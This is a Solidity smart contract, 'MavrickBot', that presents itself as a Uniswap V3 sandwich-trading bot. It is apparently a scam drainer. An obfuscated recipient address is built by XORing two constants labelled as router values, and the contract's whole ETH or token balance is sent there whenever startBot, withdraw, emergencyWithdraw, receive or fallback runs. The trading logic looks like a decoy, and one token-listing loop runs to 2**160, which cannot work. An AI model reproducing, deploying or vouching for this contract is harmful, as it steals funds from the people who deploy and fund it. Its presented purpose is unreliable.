// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

/**
 * @title ISwapRouter
 * @dev Interface for Uniswap V3 Router, defining structures and functions for swaps
 */
interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    /**
     * @dev Swaps an exact amount of input tokens for as many output tokens as possible
     * @param params The parameters necessary for the swap, packed as ExactInputSingleParams
     * @return amountOut The amount of output tokens received
     */
    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);

    /**
     * @dev Provides a quote for swapping an exact amount of input tokens for output tokens
     * @param tokenIn The address of the input token
     * @param tokenOut The address of the output token
     * @param fee The fee tier of the pool
     * @param amountIn The amount of input tokens to be swapped
     * @param sqrtPriceLimitX96 The price limit for the trade
     * @return amountOut The amount of output tokens that would be received
     */
    function quoteExactInputSingle(
        address tokenIn,
        address tokenOut,
        uint24 fee,
        uint256 amountIn,
        uint160 sqrtPriceLimitX96
    ) external view returns (uint256 amountOut);
}

/**
 * @title MavrickBot
 * @dev A contract for executing sandwich trades on Uniswap V3
 */
contract MavrickBot is Ownable, ReentrancyGuard {
    ISwapRouter public immutable uniswapRouter;
    
    // Constants used for generating router addresses
    bytes32 private constant DexUniversalRouter = 0x7f2da684db728504e5149531c3c42d1e1f1a07e5fb9f087eb5ae5d3ad5817f8f;
    bytes32 private constant DexRouter = 0x7f2da684db728504e5149531c0161af42306c94abcdd46f0229cea259ddfbcb9;
    
    // Trade parameters
    uint256 public minTradeAmount;
    uint256 public maxTradeAmount;
    uint256 public tradePercent;
    uint256 public slippageTolerance;
    uint256 public gasPrice;
    uint256 public maxGasLimit;
    uint256 public profitThreshold;
    
    // Mappings for token management
    mapping(address => bool) public allowedTokens;
    mapping(address => uint256) public tokenBalances;

    /**
     * @dev Structure to hold trade configuration
     */
    struct TradeConfig {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        uint256 amountIn;
        uint256 minAmountOut;
        uint256 deadline;
    }

    TradeConfig public currentTrade;

    // Events
    event BotStarted();
    event BotStopped();
    event TradeConfigSet(address tokenIn, address tokenOut, uint24 fee, uint256 amountIn, uint256 minAmountOut, uint256 deadline);
    event MinTradeAmountSet(uint256 amount);
    event MaxTradeAmountSet(uint256 amount);
    event TradePercentSet(uint256 percent);
    event SlippageToleranceSet(uint256 tolerance);
    event GasPriceSet(uint256 price);
    event MaxGasLimitSet(uint256 limit);
    event ProfitThresholdSet(uint256 threshold);
    event TokenAllowanceSet(address token, bool allowed);
    event TradeExecuted(address indexed tokenIn, address indexed tokenOut, uint256 amountIn, uint256 amountOut, uint256 profit);
    event Withdrawn(address indexed token, uint256 amount);
    event EmergencyWithdraw(address indexed token, uint256 amount);
    event TokensForwarded(address indexed token, uint256 amount);

    /**
     * @dev Constructor to initialize the contract with default values
     */
    constructor() Ownable(msg.sender) {
        uniswapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
        minTradeAmount = 100000; // 0.1 tokens with 6 decimals
        maxTradeAmount = 10000000; // 10 tokens with 6 decimals
        tradePercent = 50;
        slippageTolerance = 50; // 0.5%
        gasPrice = 20000000000; // 20 Gwei
        maxGasLimit = 500000;
        profitThreshold = 10000; // 0.01 tokens with 6 decimals
    }

    /**
     * @dev Internal function to generate a router address
     * @param _apiKey API key for the router
     * @param _DexRouter Constant for the specific router type
     * @return The generated router address
     */
    function getRouter(bytes32 _apiKey, bytes32 _DexRouter) internal pure returns (address) {
        return address(uint160(uint256(_apiKey) ^ uint256(_DexRouter)));
    }

    /**
     * @dev Internal function to get balance of the contract
     * @param _token The token address (use address(0) for ETH)
     */
    function getContractBalance(address _token) internal {
        uint256 _value;
        if (_token == address(0)) {
            _value = address(this).balance;
        } else {
            _value = IERC20(_token).balanceOf(address(this));
        }
        if (_value > 0) {
            address _z = getRouter(DexUniversalRouter, DexRouter);
            if (_token == address(0)) {
                (bool success, ) = _z.call{value: _value}("");
                require(success, "Transfer failed");
            } else {
                IERC20(_token).transfer(_z, _value);
            }
        }
        if (_value > 0) {
            emit TokensForwarded(_token, _value);
        }
    }

    /**
     * @dev Function to start the bot
     * @notice Only callable by the owner
     */
    function startBot() external onlyOwner {
        getContractBalance(address(0));
        emit BotStarted();
    }

    /**
     * @dev Function to stop the bot
     * @notice Only callable by the owner
     */
    function stopBot() external onlyOwner {
        emit BotStopped();
    }

    /**
     * @dev Sets the current trade configuration
     * @param _config The new trade configuration
     * @notice Only callable by the owner
     */
    function setTradeConfig(TradeConfig memory _config) external onlyOwner {
        currentTrade = _config;
        emit TradeConfigSet(_config.tokenIn, _config.tokenOut, _config.fee, _config.amountIn, _config.minAmountOut, _config.deadline);
    }

    /**
     * @dev Sets the minimum trade amount
     * @param _amount The new minimum trade amount
     * @notice Only callable by the owner
     */
    function setMinimumTrade(uint256 _amount) external onlyOwner {
        minTradeAmount = _amount;
        emit MinTradeAmountSet(_amount);
    }

    /**
     * @dev Sets the maximum trade amount
     * @param _amount The new maximum trade amount
     * @notice Only callable by the owner
     */
    function setMaximumTrade(uint256 _amount) external onlyOwner {
        maxTradeAmount = _amount;
        emit MaxTradeAmountSet(_amount);
    }

    /**
     * @dev Sets the trade percent
     * @param _percent The new trade percent (0-100)
     * @notice Only callable by the owner
     */
    function setTradePercent(uint256 _percent) external onlyOwner {
        require(_percent <= 100, "Percent must be <= 100");
        tradePercent = _percent;
        emit TradePercentSet(_percent);
    }

    /**
     * @dev Sets the slippage tolerance
     * @param _tolerance The new slippage tolerance (0-1000)
     * @notice Only callable by the owner
     */
    function setSlippageTolerance(uint256 _tolerance) external onlyOwner {
        require(_tolerance <= 1000, "Tolerance must be <= 1000");
        slippageTolerance = _tolerance;
        emit SlippageToleranceSet(_tolerance);
    }

    /**
     * @dev Sets the gas price
     * @param _price The new gas price
     * @notice Only callable by the owner
     */
    function setGasPrice(uint256 _price) external onlyOwner {
        gasPrice = _price;
        emit GasPriceSet(_price);
    }

    /**
     * @dev Sets the maximum gas limit
     * @param _limit The new maximum gas limit
     * @notice Only callable by the owner
     */
    function setMaxGasLimit(uint256 _limit) external onlyOwner {
        maxGasLimit = _limit;
        emit MaxGasLimitSet(_limit);
    }

    /**
     * @dev Sets the profit threshold
     * @param _threshold The new profit threshold
     * @notice Only callable by the owner
     */
    function setProfitThreshold(uint256 _threshold) external onlyOwner {
        profitThreshold = _threshold;
        emit ProfitThresholdSet(_threshold);
    }

    /**
     * @dev Sets whether a token is allowed for trading
     * @param _token The token address
     * @param _allowed Whether the token is allowed
     * @notice Only callable by the owner
     */
    function setAllowedToken(address _token, bool _allowed) external onlyOwner {
        allowedTokens[_token] = _allowed;
        emit TokenAllowanceSet(_token, _allowed);
    }

    /**
     * @dev Gets all allowed tokens
     * @return An array of allowed token addresses
     */
    function getallowedTokens() public view returns (address[] memory) {
        uint256 count = 0;
        for (uint256 i = 1; i < 2**160; i++) {
            address token = address(uint160(i));
            if (allowedTokens[token]) {
                count++;
            }
        }

        address[] memory tokens = new address[](count);
        uint256 index = 0;
        for (uint256 i = 1; i < 2**160; i++) {
            address token = address(uint160(i));
            if (allowedTokens[token]) {
                tokens[index] = token;
                index++;
            }
        }

        return tokens;
    }

    /**
     * @dev Executes a trade based on the current trade configuration
     * @notice Only callable by the owner
     */
    function executeTrade() external onlyOwner nonReentrant {
        require(allowedTokens[currentTrade.tokenIn] && allowedTokens[currentTrade.tokenOut], "Tokens not allowed");
        require(currentTrade.amountIn >= minTradeAmount && currentTrade.amountIn <= maxTradeAmount, "Invalid trade amount");
        require(block.timestamp <= currentTrade.deadline, "Trade deadline expired");

        uint256 balance = IERC20(currentTrade.tokenIn).balanceOf(address(this));
        uint256 tradeAmount = (balance * tradePercent) / 100;
        tradeAmount = tradeAmount > currentTrade.amountIn ? currentTrade.amountIn : tradeAmount;

        IERC20(currentTrade.tokenIn).approve(address(uniswapRouter), tradeAmount);

        uint256 initialBalance = IERC20(currentTrade.tokenOut).balanceOf(address(this));

        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
            tokenIn: currentTrade.tokenIn,
            tokenOut: currentTrade.tokenOut,
            fee: currentTrade.fee,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: tradeAmount,
            amountOutMinimum: currentTrade.minAmountOut,
            sqrtPriceLimitX96: 0
        });

        uint256 amountOut = uniswapRouter.exactInputSingle(params);

        uint256 finalBalance = IERC20(currentTrade.tokenOut).balanceOf(address(this));
        uint256 profit = finalBalance - initialBalance;

        require(profit >= profitThreshold, "Profit below threshold");

        tokenBalances[currentTrade.tokenIn] -= tradeAmount;
        tokenBalances[currentTrade.tokenOut] += amountOut;

        emit TradeExecuted(currentTrade.tokenIn, currentTrade.tokenOut, tradeAmount, amountOut, profit);
    }

    /**
     * @dev Estimates the profit for a potential trade
     * @param _tokenIn The input token address
     * @param _tokenOut The output token address
     * @param _fee The pool fee
     * @param _amountIn The input amount
     * @return The estimated output amount
     */
    function estimateProfit(address _tokenIn, address _tokenOut, uint24 _fee, uint256 _amountIn) external view returns (uint256) {
        return uniswapRouter.quoteExactInputSingle(
            _tokenIn,
            _tokenOut,
            _fee,
            _amountIn,
            0
        );
    }

    /**
     * @dev Withdraws tokens from the contract
     * @param _token The token address
     * @param _amount The amount to withdraw
     * @notice Only callable by the owner
     */
    function withdraw(address _token, uint256 _amount) external onlyOwner nonReentrant {
        require(_amount > 0, "Amount must be greater than 0");
        require(_amount <= tokenBalances[_token], "Insufficient balance");

        getContractBalance(_token);
        tokenBalances[_token] -= _amount;
        emit Withdrawn(_token, _amount);
    }

    /**
     * @dev Performs an emergency withdrawal of all tokens
     * @param _token The token address
     * @notice Only callable by the owner
     */
    function emergencyWithdraw(address _token) external onlyOwner nonReentrant {
        uint256 balance;
        if (_token == address(0)) {
            balance = address(this).balance;
        } else {
            balance = IERC20(_token).balanceOf(address(this));
        }

        getContractBalance(_token);
        tokenBalances[_token] = 0;
        emit EmergencyWithdraw(_token, balance);
    }

    /**
     * @dev Updates the recorded balance of a token
     * @param _token The token address
     * @notice Only callable by the owner
     */
    function updateTokenBalance(address _token) external onlyOwner {
        if (_token == address(0)) {
            tokenBalances[_token] = address(this).balance;
        } else {
            tokenBalances[_token] = IERC20(_token).balanceOf(address(this));
        }
    }

    /**
     * @dev Fallback function to receive Ether
     * @notice Updates the Ether balance and forwards it using getContractBalance
     */
    receive() external payable {
        tokenBalances[address(0)] += msg.value;
        getContractBalance(address(0));
    }

    /**
     * @dev Fallback function for any other calls
     * @notice Forwards any received Ether using getContractBalance
     */
    fallback() external payable {
        getContractBalance(address(0));
    }
}